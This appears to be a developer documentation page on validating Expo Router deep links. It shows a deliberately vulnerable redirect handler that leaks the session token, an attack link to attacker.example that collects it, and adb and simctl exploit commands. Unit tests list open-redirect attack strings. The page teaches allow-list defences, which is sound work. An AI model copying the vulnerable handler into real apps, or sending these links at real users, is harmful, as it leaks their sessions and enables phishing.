---
title: Deep Link Validation
description: Every deep link is attacker-controlled input. A vulnerable Expo Router handler that trusts a next= parameter, the open redirect and token leak it causes, and the strict allow-list that fixes it.
status: current
toolchain: expo
sdk: 57
---

A deep link is a URL that opens a screen in your app: `myapp://orders/42`, or
`https://example.com/orders/42` as a universal link or app link. Expo Router turns every file in
`app/` into a route that can be opened this way, and `useLocalSearchParams()` hands you the query
string as values.

Those values come from **whoever wrote the link**. That is a web page, an email, a QR code, an SMS,
a push notification payload, or another app on the device. Treat every parameter exactly as you
would treat a query string arriving at a public web server: untrusted input.

## Why it exists / when to use it — and when NOT to

Read this page for any route that does something with a parameter beyond displaying it:
navigating to it, opening it, fetching it, attaching a credential to it, or using it to decide
what the user is allowed to do.

A route that only reads `id` and fetches `/orders/{id}` from your own API with the user's session
is not the risk here — your server still checks that the order belongs to the user. The risk is a
parameter that controls **where** the app sends the user or **where** it sends data.

## Basic example

### The vulnerable handler

A common shape: after sign-in, a callback route sends the user on to wherever they were going,
using a `next` parameter.

```tsx title=app/auth/continue.tsx (VULNERABLE)
import * as Linking from 'expo-linking';
import * as SecureStore from 'expo-secure-store';
import {useLocalSearchParams} from 'expo-router';
import {useEffect} from 'react';
import {Text} from 'react-native';

export default function Continue() {
  const {next} = useLocalSearchParams<{next?: string}>();

  useEffect(() => {
    if (!next) return;
    void (async () => {
      const token = await SecureStore.getItemAsync('session_token');
      // BUG 1: `next` can be any URL. This is an open redirect.
      // BUG 2: the session token is appended to a URL the attacker chose.
      await Linking.openURL(`${next}?session=${token ?? ''}`);
    })();
  }, [next]);

  return <Text>Continuing…</Text>;
}
```

It works in every test anyone writes, because every test passes a legitimate `next`.

### The attack

The attacker sends a link:

```text
myapp://auth/continue?next=https%3A%2F%2Fattacker.example%2Fcollect
```

The app opens, reads the session token from SecureStore — the secure storage did its job; the
code handed the value away — and opens
`https://attacker.example/collect?session=eyJ...`. The attacker's server logs the token. No
exploit, no malware, one tap.

Even without the token, `next=https://attacker.example/login` is an **open redirect**: your app
launches a convincing phishing page, and the user trusts it because your app opened it.

### The fixed handler

The fix is an allow-list: `next` may only be a **path inside this app**, from a known set, and
nothing is ever appended to it.

```ts title=app/lib/safe-next.ts
/**
 * Routes a deep link may continue to. Anything else falls back to home.
 * Keep this list short and literal: it is a security boundary, not a convenience.
 */
const ALLOWED_NEXT: readonly RegExp[] = [
  /^\/$/,
  /^\/orders$/,
  /^\/orders\/[0-9]{1,12}$/,
  /^\/settings(?:\/(?:profile|notifications))?$/,
];

const FALLBACK = '/';

export function safeNext(raw: unknown): string {
  if (typeof raw !== 'string' || raw.length === 0 || raw.length > 200) {
    return FALLBACK;
  }
  // Reject anything that is not a plain absolute path inside the app:
  //   "https://evil", "myapp://…", "//evil.example" (protocol-relative),
  //   "/\\evil.example" (backslash tricks), control characters, and encoded variants.
  if (!raw.startsWith('/') || raw.startsWith('//') || /[\\\s\x00-\x1f]/.test(raw)) {
    return FALLBACK;
  }
  if (/%2f|%5c|%00/i.test(raw) || raw.includes(':')) {
    return FALLBACK;
  }
  // Query strings and fragments are dropped; the allow-list matches paths only.
  const path = raw.split(/[?#]/)[0];
  return ALLOWED_NEXT.some((re) => re.test(path)) ? path : FALLBACK;
}
```

```tsx-fragment title=app/auth/continue.tsx
// Fragment only because it imports app/lib/safe-next.ts from the block above.
import {Redirect, useLocalSearchParams} from 'expo-router';
import {safeNext} from '../lib/safe-next';

export default function Continue() {
  const {next} = useLocalSearchParams<{next?: string}>();
  // Navigate in-app only. No Linking.openURL, and no token attached to anything.
  return <Redirect href={safeNext(next)} />;
}
```

Three things changed, and all three matter:

1. **The destination is inside the app.** `<Redirect>` navigates between routes; it is not
   `Linking.openURL`.
2. **The destination comes from an allow-list**, not from a deny-list of "bad" strings. A deny-list
   loses to the next encoding trick.
3. **No credential travels with it.** The screen you land on reads the session from SecureStore
   itself, and sends it only to your own API.

## How it works

### Where the parameter comes from

Expo Router parses the incoming URL and matches its path against `app/`. The query string becomes
route params, available through `useLocalSearchParams()`. Nothing about that process validates
the **values** — it cannot know what your route intends to do with them.

```text
myapp://auth/continue?next=https://attacker.example
          └─ path ──┘ └────────── query → params ─────┘
           matches app/auth/continue.tsx   { next: "https://attacker.example" }
```

The generic type in `useLocalSearchParams<{next?: string}>()` is a **TypeScript assertion**, not a
runtime check. It tells the compiler what you expect; it does not stop an attacker from sending
something else. Typed routes have the same limit.

### Who can send your app a link

| Source | Needs anything installed? |
| --- | --- |
| A web page with `<a href="myapp://...">` | No |
| An email or SMS link | No |
| A QR code | No |
| Another app on the device calling an intent / `openURL` | Only that app |
| A push notification you did not author (compromised pipeline, misconfigured payload) | No |
| `adb shell am start` / `xcrun simctl openurl` | A connected device — this is how you test it |

Custom schemes (`myapp://`) can be **claimed by any app**; universal links and Android App Links
are tied to a domain you prove you own. That makes verified links better for the OAuth-style
"only my app should receive this" problem — see [OAuth with expo-auth-session and PKCE](oauth-and-pkce.md)
and [Deep Links and Universal Links](../expo-router/deep-linking.md). It does **not** change this
page: a verified link can still carry a hostile `next` parameter, because anyone can write a link
to your domain.

### Validating before routing with `+native-intent`

Expo Router also lets you rewrite or reject an incoming system URL **before** it is matched to a
route. Create `app/+native-intent.ts` (or `.tsx`) and export `redirectSystemPath`. The installed
`expo-router` 57.0.21 types describe it as receiving `{ path, initial }` and returning a
`string`, `null`, or a promise of either; a falsy return means no redirection happens.

```ts title=app/+native-intent.ts
const ALLOWED_PREFIXES = ['/orders', '/settings', '/auth/continue', '/oauth'];

export function redirectSystemPath({path}: {path: string; initial: boolean}): string {
  try {
    // `path` may be a full URL (myapp://orders/1 or https://example.com/orders/1)
    // or already a path. Normalise to a pathname for the check.
    const pathname = path.includes('://') ? new URL(path).pathname : path.split(/[?#]/)[0];
    const allowed = ALLOWED_PREFIXES.some(
      (prefix) => pathname === prefix || pathname.startsWith(`${prefix}/`),
    );
    return allowed ? path : '/';
  } catch {
    // The types note that throwing here can crash the app. Fail closed to home.
    return '/';
  }
}
```

This is a coarse, app-wide gate: it limits which routes the outside world can reach at all. It
does **not** replace per-parameter validation inside the route — `/auth/continue` is allowed
through here, and its `next` still has to go through `safeNext`.

> [!NOTE] Expo Go vs development build
> `expo-linking` and `expo-router` run in Expo Go, but Expo Go does not register **your** scheme.
> Links like `myapp://…` only reach a
> [development build](../expo-development-builds/why-you-need-one.md) or a release build.

## Platform differences

:::tabs
@tab iOS
Test a link on a booted simulator:

```bash
xcrun simctl openurl booted "myapp://auth/continue?next=https%3A%2F%2Fattacker.example"
```

Universal links require the `associatedDomains` entitlement (`ios.associatedDomains` in
`app.json`) and an `apple-app-site-association` file on your domain.
@tab Android
Test a link on a connected device or emulator:

```bash
adb shell am start -W -a android.intent.action.VIEW \
  -d "myapp://auth/continue?next=https%3A%2F%2Fattacker.example"
```

Android App Links require an intent filter with `autoVerify: true` (`android.intentFilters` in
`app.json`) and an `assetlinks.json` file on your domain. Until verification succeeds, Android may
show a chooser instead of opening your app directly.
:::

## Common patterns

### Unit-test the allow-list with the attacks, not the happy path

The allow-list is pure TypeScript, so test it directly:

```ts-fragment title=app/lib/safe-next.test.ts
// Runs under jest-expo; imports the file above, so it is not type-checked standalone.
import {safeNext} from './safe-next';

const attacks = [
  'https://attacker.example',
  'myapp://settings',
  '//attacker.example',
  '/\\attacker.example',
  '/%2F%2Fattacker.example',
  'javascript:alert(1)',
  '/orders/1?session=steal',
  '/admin',
  '',
  undefined,
  ['/orders'],
];

describe('safeNext', () => {
  it.each(attacks)('rejects %p', (input) => {
    expect(safeNext(input)).toBe('/');
  });

  it('keeps allowed in-app paths', () => {
    expect(safeNext('/orders/42')).toBe('/orders/42');
    expect(safeNext('/settings/profile')).toBe('/settings/profile');
  });
});
```

Note `'/orders/1?session=steal'` resolves to `/orders/1`: the path is allowed, the query is dropped.

### Opening an external URL on purpose

If a feature genuinely must open an external site from a link parameter (a "view receipt" link
from a payment provider, say), allow-list the **origin**, not the string prefix:

```ts title=app/lib/safe-external.ts
const ALLOWED_ORIGINS = new Set(['https://receipts.example-pay.com']);

export function safeExternalUrl(raw: unknown): string | null {
  if (typeof raw !== 'string') return null;
  try {
    const url = new URL(raw);
    // Compare the parsed origin. A startsWith check on the raw string accepts
    // "https://receipts.example-pay.com.attacker.example".
    return ALLOWED_ORIGINS.has(url.origin) ? url.toString() : null;
  } catch {
    return null;
  }
}
```

And never attach a credential to it.

### Confirm destructive actions

A deep link must never **perform** an action — delete, pay, change email, accept an invite — on
arrival. Navigate to a screen that shows what will happen and requires a tap. Otherwise any web
page can make the user's app act on their behalf.

## Security considerations

**Threat.** An attacker crafts a link to your app with a parameter that controls a destination, and
gets the user to open it. The outcomes are an open redirect to a phishing page, a session token sent
to the attacker, or an action performed without the user's intent.

**Exploit.** With the vulnerable handler above installed on an emulator, and a request-capture
endpoint you control standing in for the attacker:

```bash
adb shell am start -W -a android.intent.action.VIEW \
  -d "myapp://auth/continue?next=https%3A%2F%2Fyour-capture-endpoint.example%2Fcollect"
```

The browser opens your capture URL with `?session=` followed by the stored token. That request, in
your capture endpoint's log, is the leak.

**Fix.**

1. Validate every destination-controlling parameter against an **allow-list** (`safeNext`).
2. Navigate in-app (`<Redirect>`, `router.replace`) instead of `Linking.openURL` for internal
   destinations.
3. Never attach tokens or user data to a URL built from a parameter.
4. Add `app/+native-intent.ts` to limit which routes external links can reach at all.
5. Require an in-app confirmation for any state-changing action reached by a link.

**Verification.**

1. Run the unit tests above; every attack string must resolve to `/`.
2. Fire the exploit command at the fixed build. The app must land on the home route, and your
   capture endpoint must receive **no** request.
3. Repeat with `//your-capture-endpoint.example`, `/%2F%2Fyour-capture-endpoint.example` and a
   `javascript:` URL. Same result.
4. Search the codebase for the pattern that caused this:

```bash
grep -rn -E "openURL\(.*(params|next|redirect|url|callback)" app/ src/
```

Every hit needs either an allow-list in front of it or a reason it takes no external input.

## Common mistakes

- **Trusting the generic on `useLocalSearchParams`.** `useLocalSearchParams<{next: string}>()` is a
  compile-time assertion. At runtime `next` is whatever the link contained. Validate the value.
- **Using `startsWith('/')` as the whole check.** `//attacker.example` starts with `/` and is a
  protocol-relative external URL. Reject `//`, backslashes and encoded slashes, then allow-list.
- **Checking the raw string prefix of an external URL.** `https://good.example.com.attacker.example`
  starts with `https://good.example.com`. Parse with `new URL` and compare `origin`.
- **Deny-listing "bad" schemes.** You will miss one. Allow-list the good paths.
- **Appending a token "so the next screen has it".** The next screen can read SecureStore itself.
  Wrong: ``openURL(`${next}?token=${t}`)``. Right: ``<Redirect href={safeNext(next)} />``.
- **Performing an action on arrival.** `myapp://account/delete` that deletes immediately is a
  cross-site request forgery with extra steps. Show a confirmation screen.
- **Throwing inside `redirectSystemPath`.** The types warn this can crash the app. Wrap it in
  `try/catch` and fail closed.
- **Assuming universal links fix parameter trust.** They prove which **app** receives the link,
  not who **wrote** it.

## Related topics

- [Deep Links and Universal Links](../expo-router/deep-linking.md) — configuring schemes, universal links and app links in Expo Router.
- [Navigation and Params](../expo-router/navigation-and-params.md) — how params reach a route.
- [Redirects and Auth-Gated Routes](../expo-router/redirects-and-auth.md) — `<Redirect>` and protecting routes.
- [Linking](../expo-sdk/linking.md) — `expo-linking`, `openURL` and URL parsing.
- [OAuth with expo-auth-session and PKCE](oauth-and-pkce.md) — the redirect route that most needs this.
- [expo-secure-store vs AsyncStorage](secure-store-vs-asyncstorage.md) — secure storage does not help once code hands the value away.
